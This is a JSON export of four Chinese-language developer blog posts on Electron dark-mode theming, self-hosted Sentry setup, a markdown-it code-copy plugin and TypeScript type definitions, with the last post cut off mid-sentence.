[{"title":"Electron - 搞一把深色主题","path":"/2023/10/29/1dbb59fcd9ec/","content":"什么是深色主题深色主题到底是什么？这个讲法其实很宽泛，我们以往见过不少深色调为主的界面配色方案。比如程序员非常熟悉的代码编辑器，各种深色皮肤早就大行其道。而我们今天要讨论的，主要是苹果近年来的产品中推出的深色主题功能，以及其在 Electron 中的应用实现。 苹果在 2017 年发布的 macOS High Sierra (10.13) 首先实验性地支持了深色顶栏和 dock，继而在 Mojave (10.14) 提供了完整的深色主题支持。接下来的 Catalina (10.15) 则增加了 Auto 选项，可以随一天中的时间变化自动切换系统主题。后续的大版本更新也不断优化这个功能。在移动端，iOS 13 开始加入深色主题功能。macOS 启用深色主题后，内置的应用会切换为深灰色为主的配色，字体则显示为浅灰色。 第三方应用如果适配了深色主题，也会根据设置改变自身的界面配色。 目前主流的 App 及网站都适配了深色主题，那么接下来我们看下用 Electron 开发一个客户端软件，如何实现深色主题吧。 自定义界面Electron 允许开发者使用 Web 技术构建桌面应用程序，因此可以使用网页技术来判断当前页面是否该显示深色主题。 用 CSS 判断 你可以通过 prefers-color-scheme CSS 媒体查询来实现此功能 12345678910111213@media (prefers-color-scheme: dark) &#123; body &#123; background: #333; color: white; &#125;&#125;@media (prefers-color-scheme: light) &#123; body &#123; background: #ddd; color: black; &#125;&#125; 用 js 判断 用 Media Query 来判断用户当前的系统主题，然后在根节点中添加不同的 class 来区分主题 123456789101112131415const isDark = window.matchMedia(&#x27;(prefers-color-scheme: dark)&#x27;);document.body.classList.remove(&#x27;dark&#x27;, &#x27;light&#x27;);document.body.classList.remove(isDark ? &#x27;dark&#x27; : &#x27;light&#x27;);## style.css.dark &#123; background: #333; color: white;&#125;.light &#123; background: #ddd; color: black;&#125; 虽然用 CSS 和 JS 都可以实现渲染不同的系统主题，但是如果要实现用户自主选择主题，这是就需要 localStorage 来记住用户选择，因此用 JS 来实现更好。 在 Vue 框架中要更好的使用主题切换的话，可以将这部分 js 逻辑抽离成一个 hook，下面给出个示例代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103import &#123; ref, computed &#125; from &quot;vue&quot;;export type BasicColorMode = &quot;light&quot; | &quot;dark&quot;;export type BasicColorSchema = BasicColorMode | &quot;system&quot;;interface UseThemeOptions &#123; /** * 目标元素选择器 * @default &#x27;html&#x27; */ selector?: string; /** * 目标元素修改属性 * * @default &#x27;class&#x27; */ attribute?: string; /** * 初始主题 * @default &#x27;system&#x27; */ initialValue?: BasicColorSchema; /** * 保存到 localStorage/sessionStorage 中的值对应的 key * @default &#x27;color-scheme&#x27; */ storageKey?: string; /** * 存储对象，默认为 localStorage * @default localStorage */ storage?: Storage; /** * 当 isDark=true 时应用于目标元素的值 * * @default &#x27;dark&#x27; */ valueDark?: string; /** * 当 isDark=false 时应用于目标元素的值 * * @default &#x27;light&#x27; */ valueLight?: string; /** * 切换主题时触发的回调函数 */ onChanged?: (dark: boolean, mode: BasicColorSchema) =&gt; void;&#125;export const useTheme = (options: UseThemeOptions = &#123;&#125;) =&gt; &#123; const &#123; selector = &quot;html&quot;, attribute = &quot;class&quot;, initialValue = &quot;system&quot;, storageKey = &quot;color-scheme&quot;, storage = localStorage, valueDark = &quot;dark&quot;, valueLight = &quot;light&quot;, onChanged, &#125; = options; const mode = ref&lt;BasicColorSchema&gt;(initialValue); const checkSystemDark = () =&gt; window.matchMedia(&quot;(prefers-color-scheme: dark)&quot;).matches; const checkDark = (colorSchema: BasicColorSchema) =&gt; &#123; if (colorSchema === &quot;system&quot;) &#123; return checkSystemDark(); &#125; return colorSchema === &quot;dark&quot;; &#125;; const setThemeClass = (colorSchema: BasicColorSchema) =&gt; &#123; const _isDark = checkDark(colorSchema); const isClass = attribute === &quot;class&quot;; const domTarget = document.querySelector(selector); const valueMode = _isDark ? valueDark : valueLight; if (isClass) &#123; domTarget?.classList.remove(valueDark, valueLight); domTarget?.classList.add(valueMode); &#125; else &#123; domTarget?.setAttribute(attribute, valueMode); &#125; &#125;; const setMode = (_mode: BasicColorSchema) =&gt; &#123; mode.value = _mode; storage.setItem(storageKey, _mode); setThemeClass(_mode); onChanged?.(checkDark(_mode), _mode); &#125;; const localMode = storage.getItem(storageKey); localMode &amp;&amp; setMode(localMode as BasicColorSchema); const isDark = computed(() =&gt; checkDark(mode.value)); return &#123; isDark, mode, setMode &#125;;&#125;; 默认情况下，使用 Tailwind CSS 偏好的深色模式，当将 class dark 应用于 html 标签时启用深色模式，例如： 123456789&lt;!--light--&gt;&lt;html&gt; ...&lt;/html&gt;&lt;!--dark--&gt;&lt;html class=&quot;dark&quot;&gt; ...&lt;/html&gt; 不过，还可以对其进行自定义，使其与大多数 CSS 框架兼容。例如： 123456const &#123; isDark &#125; = useTheme(&#123; selector: &quot;body&quot;, attribute: &quot;color-scheme&quot;, valueDark: &quot;dark&quot;, valueLight: &quot;light&quot;,&#125;); 最终会呈现 123456789&lt;!--light--&gt;&lt;html&gt; &lt;body color-scheme=&quot;light&quot;&gt; ... &lt;/body&gt;&lt;/html&gt;&lt;!--dark--&gt;&lt;html&gt; &lt;body color-scheme=&quot;dark&quot;&gt; ... &lt;/body&gt;&lt;/html&gt; 如果上面的配置任然不满足你的需求，可以使用 onChange 完全控制你的主题切换 12345const &#123; isDark &#125; = useTheme(&#123; onChanged(dark: boolean) &#123; // update the dom, call the API or something &#125;,&#125;); 如何在组件中使用 123456789101112131415161718&lt;script setup lang=&quot;ts&quot;&gt;import &#123; useTheme &#125; from &quot;./hooks/useTheme&quot;;const &#123; mode, isDark, setMode &#125; = useTheme();const resetMode = () =&gt; setMode(&quot;system&quot;);const checkMode = () =&gt; setMode(isDark.value ? &quot;light&quot; : &quot;dark&quot;);&lt;/script&gt;&lt;template&gt; &lt;div&gt; &lt;p&gt; Current theme source: &lt;strong&gt;&#123;&#123; mode &#125;&#125;&lt;/strong&gt; &lt;/p&gt; &lt;button type=&quot;button&quot; @click=&quot;checkMode&quot;&gt;Toggle Dark Mode&lt;/button&gt; &lt;button type=&quot;button&quot; @click=&quot;resetMode&quot;&gt;Reset to System Theme&lt;/button&gt; &lt;/div&gt;&lt;/template&gt; 切换效果如下： 原生界面在切换主题时，会发现有部分页面并不会跟着切换，这是因为整个页面由两部分组成，原生界面和自定义界面，原生界面又分为标题栏和工具栏，这部分不能用 web 技术来操控，需要用系统的 API。 首先在 preload.js 中，暴露两个 IPC 通道到渲染器进程中 1234const &#123; contextBridge, ipcRenderer &#125; = require(&#x27;electron&#x27;)contextBridge.exposeInMainWorld(&#x27;darkMode&#x27;, &#123; toggle: () =&gt;ipcRenderer.invoke(&#x27;dark-mode:toggle&#x27;), system: () =&gt;ipcRenderer.invoke(&#x27;dark-mode:system&#x27;) &#125;) 然后在主进程中添加事件处理函数，用 nativeTheme API 修改系统样式 123456789101112const &#123; app, BrowserWindow, ipcMain, nativeTheme &#125; = require(&#x27;electron&#x27;) constpath = require(&#x27;node:path&#x27;) const createWindow = () =&gt; &#123; const win = newBrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; preload:path.join(__dirname, &#x27;preload.js&#x27;) &#125; &#125;) win.loadFile(&#x27;index.html&#x27;)ipcMain.handle(&#x27;dark-mode:toggle&#x27;, () =&gt; &#123; if (nativeTheme.shouldUseDarkColors)&#123; nativeTheme.themeSource = &#x27;light&#x27; &#125; else &#123; nativeTheme.themeSource = &#x27;dark&#x27; &#125;return nativeTheme.shouldUseDarkColors &#125;) ipcMain.handle(&#x27;dark-mode:system&#x27;, ()=&gt; &#123; nativeTheme.themeSource = &#x27;system&#x27; &#125;) &#125; app.whenReady().then(() =&gt; &#123;createWindow() app.on(&#x27;activate&#x27;, () =&gt; &#123; if(BrowserWindow.getAllWindows().length === 0) &#123; createWindow() &#125; &#125;) &#125;)app.on(&#x27;window-all-closed&#x27;, () =&gt; &#123; if (process.platform !== &#x27;darwin&#x27;) &#123;app.quit() &#125; &#125;) 最后在渲染进程中通过 window.darkMode 发送消息到主进程中 123const &#123; mode, isDark, setMode &#125; = useTheme(&#123; onChanged: (dark, _mode) =&gt; &#123; if(_mode === &#x27;system&#x27;) &#123; window.darkMode.system() &#125; else &#123;window.darkMode.toggle() &#125; &#125; &#125;); 现在还有个问题，每次启动时默认的都是系统主题，因此需要将用户选择的主题保存到本地，我们使用 electron-store 来保存用户配置（你也可以使用任何你喜欢的存储方式） 1234567891011121314import &#123; nativeTheme &#125; from &quot;electron&quot;;import Store from &quot;electron-store&quot;;type ThemeColor = typeof nativeTheme.themeSource;const store = new Store&lt;&#123; theme: ThemeColor &#125;&gt;(&#123; defaults: &#123; theme: &quot;system&quot;, &#125;,&#125;);export const getThemeStore = () =&gt; store.get(&quot;theme&quot;);export const setThemeStore = (theme: ThemeColor) =&gt; store.set(&quot;theme&quot;, theme); 然后在主进程中，根据用户配置，重置默认主题 12const themeColor = getThemeStore();nativeTheme.themeSource = themeColor; 整合一下现在渲染进程和主进程都分别实现了主题的切换并且都能根据用户的配置选择默认主题。但是这里有些问题： 主题配置在主进程和渲染进程都保存了一遍有些冗余 主题的切换过程中数据流向有些混乱，最好能保持单向数据流。 因此最终的版本中我们删掉渲染进程的配置保存，将用户选择的主题保存到主进程中，最后梳理出的流程图如下： 整合之后的效果如下，示例代码：https://github.com/bijinfeng/electron-vue-theme-switch 总结Electron 使用了 web 技术栈渲染自定义界面，因此在自定义界面实现暗黑主题和在网页端没有区别，技术都是通用的。但是 Electron 中还有原生界面存在，虽然有提供 API 去修改主题，但是要和自定义界面做到同步修改，整合两边的技术方案也是一个比较麻烦的事，这里提供一种技术实现思路。"},{"title":"私有化部署 Sentry 及接入踩坑记录","path":"/2023/10/06/c32a83b54674/","content":"简介Sentry 是什么？中文翻译过来是「哨兵」的意思，没错，它是程序的哨兵，它可以监控我们在生产环境中项目的运行状态，一旦某段代码运行报错、或者发生异常，会第一时间将报错的信息：页面路由、异常文件、请求方式等一些非常详细的信息以消息或者邮件的方式通知我们，告诉我们：程序出错了。而我们可以从详细的报错信息中快速分析问题所在，从而快速地修复 Bug。 为什么是 Sentry？是的，在市场上有许多供应商提供类似的一体化解决方案，国外有 BugSnag、 RollBar，国内有 oneapm、fundebug，那为什么我们偏偏选择 Sentry 呢？因为 Sentry 是 100% 开源的，我们可以使用它的 SaaS 版的，除此之外我们也可以私有化部署。另外 Sentry 支持主流的编程语言，可以通过 这里 查看所有支持的语言。通过下面这张图可以看出，Sentry 在前端的近两年发展趋势，以及与其它竞争者对比： 可以看到 Sentry 的 npm 下载量基本是稳步上升，同时引入 Sentry 包体积还很小，打包后只有 20k： 如何私有化部署？Sentry 官方提供了基于云的 SaaS 服务，那么为什么还要私有化部署呢？这是因为如果对于数据隐私和安全有着更高的要求，或者需要更多的自定义和控制权，那么私有化部署 Sentry 是个更好的选择。 Sentry 可以使用 Docker、Docker-compose、K8s 的方式部署在自己的服务器上。关于私有化部署的方法这里给出参考文档，如有需要可以看看： Self-Hosted Sentry Sentry 10 helm charts 需要注意的是最新版本的 sentry 的功能很强大，但是同时带来的是对服务器的性能要求很高，因此如果只需要 sentry 最基本的功能，推荐部署 sentry 9.1.2 的版本，下面是两个版本需要的资源和功能对比：23.9.1 Docker 19.03.6+ Compose 2.0.1+ 4 CPU Cores 8 GB RAM 20 GB Free Disk Space 9.1.2 Docker 17.05.0+ Compose 1.17.0+ 3 GB RAM 总结一下，如果你需要更完备的错误追踪和分析功能并且恰好财力雄厚，建议使用官方的 SaaS 服务或者私有化部署最新版本，否则还是建议部署 9.1.2 版本，该有的功能都有，够你使用了。 如何接入前端 SDK?既然私有化部署了 sentry 的 9.1.2 版本，接下来就是在前端接入上报 SDK，然而官方文档上默认针对的都是最新版本，像 9.1.2 这样的上古版本接入文档早就淹没在浩瀚的历史变更记录中，互联网上更多的也是新版本的资料。经过不断的踩坑，终于是完成了 9.1.2 版本的 sdk 接入，由于精力有限，只完成了 Electron 和 Vue 平台的接入，其他平台的就不在此记录了。 Electron 安装 sdk 1pnpm add @sentry/electron 在主进程入口文件初始化 sentry（尽可能的提前初始化） 12345678import * as Sentry from &quot;@sentry/electron&quot;;import packageJson from &quot;../../../package.json&quot;;Sentry.init(&#123; dsn: SENTRY_DSN, sampleRate: 1, release: packageJson.version,&#125;); Vue 除了需要特定版本的 sdk，其他的可以参考官方文档 安装 sdk 12## 最新版本的 sdk 不兼容 9.1.2 版本的 sentry，使用旧版本pnpm add @sentry/vue@5.30.0 -D 初始化 sdk 12345678import * as Sentry from &quot;@sentry/vue&quot;;import Vue from &quot;vue&quot;;Sentry.init(&#123; Vue, dsn: SENTRY_DSN, release: packageJson.version,&#125;); 上传 Source Map接入 sdk 后，我们手动触发个错误，就可以看到在 sentry 上多出来一个新的 Issue，点开可以看到更详细的报错信息： 但是这个报错信息对我们的意义却不是很大，因为根据这份报错信息我们没法锁定出问题的源码位置。可能会有小机灵鬼说，我明明看到了错误堆栈，里面有错误的文件名，行数和列数，为什么还是没办法锁定？ 这是因此现代前端部署的代码都是合并和压缩过的，就不是给人类读的，相信我没有超能力别指望能反推出源码。这时就需要借助 source map 了，什么？不知道什么是 source map？建议先看外这篇文章《深入浅出之 Source Map》再往下看。而且幸好的是 sentry 集成了 source map 的解析能力（在 9.1.2 这个版本也是有的，只是藏的有点深） 上面看完了相信你也明白了 source map 的重要性，接下我们开始上传 source map 到 sentry： 安装 webpack sdk sentry 针对不同的编译器有不同的上传 sdk，其他平台见官方文档，或者使用 cli 上传，但是为了省事和简化流程，我们采用 sdk 的上传方式 1pnpm add @sentry/webpack-plugin@2.7.1 -D 配置 webpack 插件 12345678910111213141516171819202122const &#123; sentryWebpackPlugin &#125; = require(&quot;@sentry/webpack-plugin&quot;);const packageJson = require(&quot;./package.json&quot;);module.exports = &#123; productionSourceMap: true, // 生产环境生成 source map configureWebpack: &#123; plugins: [ sentryWebpackPlugin(&#123; org: &quot;xxxx&quot;, project: &quot;xxxx&quot;, url: &quot;xxxx&quot;, authToken: &quot;xxxx&quot;, release: &#123; name: packageJson.version, uploadLegacySourcemaps: &#123; paths: [&quot;./dist_electron/bundled&quot;], &#125;, &#125;, &#125;), ], &#125;,&#125;; 更多配置参数见官方文档：@sentry&#x2F;webpack-plugin，这里着重介绍下需要注意的点： webpack 需要生成 source map，没有的话，sdk 就是无米而炊 release.name 需要和上报 sdk 里的 release 字段保持一致，以便于将异常按照 release 进行分类 uploadLegacySourcemaps 配置需要上传的文件目录 以上配置完成后，运行打包命令，就可以在 sentry 中看到上传的 source map 了 有了 source map，sentry 就能根据 source map 解析出源码位置 自定用户信息在 sentry 的默认上报中，只会上报用户 ip 地址作为用户的身份标识，这对我们针对特定用户排查日志时，不能说毫无帮助，只能说聊胜于无，因此我们需要上报一些特定的字段用作用户的身份标识，比如 username，email，id 等等： 1234567891011121314151617import * as Sentry from &quot;@sentry/vue&quot;;Sentry.init(&#123; // 初始化参数 ...&#125;);// 自定义用户信息，setUser 的入参类型如下：// export interface User &#123;// [key: string]: any;// id?: string;// ip_address?: string;// email?: string;// username?: string;// &#125;Sentry.setUser(&#123; id: xxx, username: xxx, email: xxx &#125;); before： after： 总结sentry 是前端异常监控的不二选择，由于其是开源项目，我们可以选择私有化部署，而 9.1.2 版本就是考虑功能性和部署成本的最优解。 参考 https://juejin.cn/post/7023537118454480904#heading-23 https://zhuanlan.zhihu.com/p/287941396"},{"title":"markdown-it：添加代码复制功能","path":"/2023/09/01/d24e5effb3b7/","content":"markdown-it 渲染出来的代码块如下面左图一样，光秃秃的一块，也没有任何交互功能，现在我们来美化一下，添加一个 copy 代码的按钮，将代码块的语言也一并显示出来。 开发插件要实现上面的功能，光用 CSS 来做是不够的，我们需要借助 markdown-it 的插件机制，用插件实现上面的功能。 我们的插件用 TypeScript 开发，所以先安装 markdown-it 的类型文件，获取类型说明 1pnpm add @types/markdown-it -D 添加一个插件模板 123456import type MarkdownIt from &quot;markdown-it&quot;;export default (md: MarkdownIt) =&gt; &#123;\t# .....&#125;; 实现功能（由于插件比较简单，这里不多做解释，直接看注释就行） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import type MarkdownIt from &quot;markdown-it&quot;;import type Renderer from &quot;markdown-it/lib/renderer&quot;;import ClipboardJS from &quot;clipboard&quot;;import &#123; escape &#125; from &quot;lodash-es&quot;;const clipboard = new ClipboardJS(&quot;.markdown-it-code-copy&quot;);// 未 copy 时按钮的 innerHTMLconst copyInnerHTML = ` &lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; role=&quot;img&quot; class=&quot;octicon octicon-copy&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;12&quot; height=&quot;12&quot; fill=&quot;currentColor&quot; style=&quot;display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;&quot;&gt;&lt;path d=&quot;M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z&quot;&gt;&lt;/path&gt;&lt;/svg&gt; &lt;span&gt;Copy&lt;/span&gt;`;// copy 后按钮的 innerHTMLconst copiedInnerHTML = ` &lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; role=&quot;img&quot; class=&quot;octicon octicon-check&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;12&quot; height=&quot;12&quot; fill=&quot;currentColor&quot; style=&quot;display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;&quot;&gt;&lt;path d=&quot;M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z&quot;&gt;&lt;/path&gt;&lt;/svg&gt; &lt;span&gt;Copied!&lt;/span&gt;`;clipboard.on(&quot;success&quot;, (e) =&gt; &#123; const trigger = e.trigger; e.clearSelection(); trigger.innerHTML = copiedInnerHTML; setTimeout(() =&gt; &#123; trigger.innerHTML = copyInnerHTML; &#125;, 3000);&#125;);// 用正则提取出 code 的语言const getCodeLangFragment = (htmlString: string) =&gt; &#123; const regex = /&lt;code class=&quot;hljs (language-([a-z]+))&quot;&gt;/; const match = htmlString.match(regex); return match?.[2] || &quot;&quot;;&#125;;const renderCode = (renderer: Renderer.RenderRule): Renderer.RenderRule =&gt; &#123; return (...args) =&gt; &#123; const [tokens, idx] = args; const content = escape(tokens[idx].content); const origRendered = renderer.apply(this, args); if (content.length === 0) return origRendered; const lang = getCodeLangFragment(origRendered); return ` &lt;div class=&quot;code-enhance&quot;&gt; &lt;div class=&quot;code-enhance-header&quot;&gt; &lt;span&gt;$&#123;lang&#125;&lt;/span&gt; &lt;span class=&quot;markdown-it-code-copy code-enhance-copy&quot; data-clipboard-text=&quot;$&#123;content&#125;&quot;&gt; $&#123;copyInnerHTML&#125; &lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;code-enhance-content&quot;&gt; $&#123;origRendered&#125; &lt;/div&gt; &lt;/div&gt; `; &#125;;&#125;;/** * markdown-it 的插件，添加代码语言显示和 copy 代码按钮 */export default (md: MarkdownIt) =&gt; &#123; if (md.renderer.rules.code_block != null) &#123; md.renderer.rules.code_block = renderCode(md.renderer.rules.code_block); &#125; if (md.renderer.rules.fence != null) &#123; md.renderer.rules.fence = renderCode(md.renderer.rules.fence); &#125;&#125;; 添加样式1234567891011121314151617181920212223242526272829303132333435363738394041.code-enhance &#123; display: flex; flex-direction: column; border-radius: 7px; overflow: hidden; margin-top: 10px; &amp;-header &#123; background-color: #e2e6ea; height: 32px; box-sizing: border-box; padding: 0 16px; font-size: 12px; display: flex; justify-content: space-between; align-items: center; gap: 8px; &#125; &amp;-content &#123; background-color: #fff; padding: 1em; pre &#123; margin: 0; &#125; code &#123; padding: 0 !important; &#125; &#125; &amp;-copy &#123; font-size: 12px; display: inline-flex; align-items: center; cursor: pointer; gap: 6px; line-height: 1.5; &#125;&#125; 安装插件12345import markdownIt from &quot;markdown-it&quot;;import markdownItCodeCopy from &quot;./markdown-it-code-copy&quot;;const md = markdownIt().use(markdownItCodeCopy);"},{"title":"TypeScript 从入门到入土 - 类型定义","path":"/2023/08/29/7252827e19c3/","content":"💡 入门教程推荐：[https://ts.xcatliu.com/](https://ts.xcatliu.com/) 本文不是 TS 的入门教程，可以看成是 《[TypeScript 入门教程](https://ts.xcatliu.com/)》的读书笔记，在后面使用 TS 的过程中，想不起来怎么用时，可以用来查询和翻阅的工具。 原始数据类型JS 中包含的原始数据类型有：布尔值、数值、字符串、null、undefined 以及 ES6 中的新类型 Symbol 和 ES10 中的新类型 BigInt。 下面介绍下这些原始数据类型在 TS 中的应用： 123456789101112131415161718// 布尔值const isDone: boolean = false;// 数值const decLiteral: number = 6;// 字符串const myName: string = &quot;Tom&quot;;// Null 和 Undefinedconst u: undefined = undefined;const n: null = null;// Symbolconst s: symbol = Symbol(&quot;a&quot;);// BigIntconst b: bigint = BigInt(10); 注意：上面的用法是个错误 ❌ 例子，只是为了说明怎么显示的定义类型而作的说明，在真实的项目中不要这么使用。 原因是 TypeScript 能够根据参数、属性和变量的默认值或初始值推断其类型。无需显示的注释其类型。这样做会给代码增加不必要的冗长，使其更难以阅读，并且在某些情况下可能会阻止 TypeScript 推断更具体的类型。 例如：const isDone &#x3D; false 的类型会自动推断为 false，let isDone &#x3D; false 的类型才会推断为 boolean，因此如果给 const 定义的 isDone 显示的注释其类型为 boolean 的化，会扩大它的类型范围，带来一些不必要的风险。 因此只建议在定义一个变量没有初始值的情况下显示的定义其类型（而且也是必须的）： 如果定义的时候没有赋值或者指定类型，不管之后有没有赋值，都会被推断成 any 类型而完全不被类型检查 123let myFavoriteNumber; // myFavoriteNumber 的类型就是 any 了，之后可以被任何类型的变量赋值myFavoriteNumber = &quot;seven&quot;;myFavoriteNumber = 7; 在定义变量没有默认值的情况下，必须指定其类型 123456789101112131415161718// 布尔值let isDone: boolean;// 数值let decLiteral: number;// 字符串let myName: string;// Null 和 Undefinedlet u: undefined;let n: null;// Symbollet s: symbol;// BigIntlet b: bigint; 注意，TypeScript 中使用字面量和构造函数定义的变量的类型是不一样的： 12let bool1: boolean = false;let bool2: Boolean = new Boolean(0); 其他的基本类型都是一样，不再赘述。 void 和 neverJavascript 中没有 void 和 never 的概念。在 TypeScript 中，其作用如下： void表示没有任何返回值的函数 never表示那些永远不存的值的类型，例如那些总是会抛出异常或根本就不会有返回值的函数 void 应用场景： 123function alertName(): void &#123; alert(&quot;My name is Tom&quot;);&#125; 声明一个 void 类型的变量没有什么用，因为你只能将它赋值为 undefined 和 null（只在 –strictNullChecks 未指定时） 1let unusable: void = undefined; never 应用场景： 1234567891011121314// 返回never的函数必须存在无法达到的终点function error(message: string): never &#123; throw new Error(message);&#125;// 推断的返回值类型为neverfunction fail() &#123; return error(&quot;Something failed&quot;);&#125;// 返回never的函数必须存在无法达到的终点function infiniteLoop(): never &#123; while (true) &#123;&#125;&#125; never 类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是 never 的子类型或可以赋值给 never 类型（除了 never 本身之外）。 即使 any 也不可以赋值给 never。 对象类型使用 interface 定义对象的类型： 123456789interface Person &#123; name: string; age: number;&#125;let tom: Person = &#123; name: &quot;Tom&quot;, age: 25,&#125;; 上面的例子中，tom 的形状和接口 Person 必须一致，对象的元素不允许多也不允许少，赋值的时候变量的形状必须和接口的形状保持一致。 如何少一些字段：使用可选属性 ?:，但是依旧不允许添加未定义的属性： 12345678910111213141516interface Person &#123; name: string; age?: number;&#125;let tom: Person = &#123; name: &quot;Tom&quot;,&#125;;let tom1: Person = &#123; name: &quot;Tom&quot;, age: 25, gender: &quot;male&quot;,&#125;;// examples/playground/index.ts(9,5): error TS2322: Type &#x27;&#123; name: string; age: number; gender: string; &#125;&#x27; is not assignable to type &#x27;Person&#x27;.// Object literal may only specify known properties, and &#x27;gender&#x27; does not exist in type &#x27;Person&#x27;. 如何多一些字段：可以定义一个任意属性，需要注意的是，一个接口只能定义一个任意属性： 123456789101112131415161718192021interface Person &#123; name: string; age?: number; [propName: string]: string;&#125;let tom: Person = &#123; name: &quot;Tom&quot;, gender: &quot;male&quot;,&#125;;let tom1: Person = &#123; name: &quot;Tom&quot;, age: 25, gender: &quot;male&quot;,&#125;;// index.ts(3,5): error TS2411: Property &#x27;age&#x27; of type &#x27;number&#x27; is not assignable to string index type &#x27;string&#x27;.// index.ts(7,5): error TS2322: Type &#x27;&#123; [x: string]: string | number; name: string; age: number; gender: string; &#125;&#x27; is not assignable to type &#x27;Person&#x27;.// Index signatures are incompatible.// Type &#x27;string | number&#x27; is not assignable to type &#x27;string&#x27;.// Type &#x27;number&#x27; is not assignable to type &#x27;string&#x27;. 注意：一旦定义了任意属性，那么确定属性和可选属性的类型都必须是它的类型的子集，上例中，任意属性的值允许是 string，但是可选属性 age 的值却是 number，number 不是 string 的子属性，所以报错了。 属性只读：使用 readonly 定义的只读属性只能在创建的是否被赋值： 12345678910111213141516interface Person &#123; readonly id: number; name: string; age?: number; [propName: string]: any;&#125;let tom: Person = &#123; id: 89757, name: &quot;Tom&quot;, gender: &quot;male&quot;,&#125;;tom.id = 9527;// index.ts(14,5): error TS2540: Cannot assign to &#x27;id&#x27; because it is a constant or a read-only property. 注意，只读的约束存在于第一次给对象赋值的时候，而不是第一次给只读属性赋值的时候 数组类型在 TypeScript 中，定义数组类型的方式有多种，比较灵活。 1234567891011// 「类型 + 方括号」表示法let fibonacci: number[] = [1, 1, 2, 3, 5];// 数组泛型let fibonacci: Array&lt;number&gt; = [1, 1, 2, 3, 5];// 接口interface NumberArray &#123; [index: number]: number;&#125;let fibonacci: NumberArray = [1, 1, 2, 3, 5]; 函数类型在 JavaScript 中，有两种常见的定义函数的方式 - 函数声明和函数表达式：函数函数声明： 12345678// 函数声明function sum(x, y) &#123; return x + y;&#125;// 添加类型定义function sum(x: number, y: number): number &#123; return x + y;&#125; 函数表达式： 12345678910111213141516171819202122232425// 函数表达式let mySum = function (x, y) &#123; return x + y;&#125;;// 添加类型定义let mySum = function (x: number, y: number): number &#123; return x + y;&#125;;// 上面 mySum 的类型是根据 = 的右侧推断出来的，如果需要显示的指定其类型let mySum: (x: number, y: number) =&gt; number = function ( x: number, y: number): number &#123; return x + y;&#125;;// 可以使用接口来定义函数的类型interface SearchFunc &#123; (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc = function (source: string, subString: string) &#123; return source.search(subString) !== -1;&#125;; 参数可选：与接口中的可选属性类似，我们用 ? 表示可选的参数，需要注意的是：可选参数后面不允许再出现必需参数了 123456789function buildName(firstName: string, lastName?: string) &#123; if (lastName) &#123; return firstName + &quot; &quot; + lastName; &#125; else &#123; return firstName; &#125;&#125;let tomcat = buildName(&quot;Tom&quot;, &quot;Cat&quot;);let tom = buildName(&quot;Tom&quot;); 参数默认值：在 ES6 中，我们允许给函数的参数添加默认值，TypeScript 会将添加了默认值的参数识别为可选参数： 12345function buildName(firstName: string, lastName: string = &quot;Cat&quot;) &#123; return firstName + &quot; &quot; + lastName;&#125;let tomcat = buildName(&quot;Tom&quot;, &quot;Cat&quot;);let tom = buildName(&quot;Tom&quot;); 此时就不受「可选参数必须接在必需参数后面」的限制了： 12345function buildName(firstName: string = &quot;Tom&quot;, lastName: string) &#123; return firstName + &quot; &quot; + lastName;&#125;let tomcat = buildName(&quot;Tom&quot;, &quot;Cat&quot;);let cat = buildName(undefined, &quot;Cat&quot;); 剩余参数：ES6 中，可以使用 ...rest 的方式获取函数中的剩余参数（rest 参数）： 12345678function push(array, ...items) &#123; items.forEach(function (item) &#123; array.push(item); &#125;);&#125;let a: any[] = [];push(a, 1, 2, 3); 事实上，items 是一个数组。所以我们可以用数组的类型来定义它： 12345678function push(array: any[], ...items: any[]) &#123; items.forEach(function (item) &#123; array.push(item); &#125;);&#125;let a = [];push(a, 1, 2, 3); 函数重载：重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。比如，我们需要实现一个函数 reverse，输入数字 123 的时候，输出反转的数字 321，输入字符串 ‘hello’ 的时候，输出反转的字符串 ‘olleh’。利用联合类型，我们可以这么实现： 1234567function reverse(x: number | string): number | string | void &#123; if (typeof x === &quot;number&quot;) &#123; return Number(x.toString().split(&quot;&quot;).reverse().join(&quot;&quot;)); &#125; else if (typeof x === &quot;string&quot;) &#123; return x.split(&quot;&quot;).reverse().join(&quot;&quot;); &#125;&#125; 然而这样有一个缺点，就是不能够精确的表达，输入为数字的时候，输出也应该为数字，输入为字符串的时候，输出也应该为字符串。这时，我们可以使用重载定义多个 reverse 的函数类型： 123456789function reverse(x: number): number;function reverse(x: string): string;function reverse(x: number | string): number | string | void &#123; if (typeof x === &quot;number&quot;) &#123; return Number(x.toString().split(&quot;&quot;).reverse().join(&quot;&quot;)); &#125; else if (typeof x === &quot;string&quot;) &#123; return x.split(&quot;&quot;).reverse().join(&quot;&quot;); &#125;&#125; 上例中，我们重复定义了多次函数 